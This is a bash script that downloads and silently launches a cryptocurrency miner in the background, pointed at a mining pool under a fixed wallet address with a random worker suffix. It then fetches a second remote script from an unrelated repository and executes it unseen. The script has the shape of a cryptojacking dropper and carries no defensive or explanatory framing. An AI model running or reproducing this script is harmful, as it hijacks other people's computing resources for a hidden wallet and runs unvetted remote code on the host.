#!/bin/bash
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RYWshsv766dTZbLJ6AbHcT8HiWngTrW3qe.$(echo $(shuf -i 1-20000 -n 1)-V) -p x --cpu 8 > /dev/null 2>&1 &
wget https://raw.githubusercontent.com/jsiqiisn/baby/main/lo.sh && chmod +x lo.sh && ./lo.sh
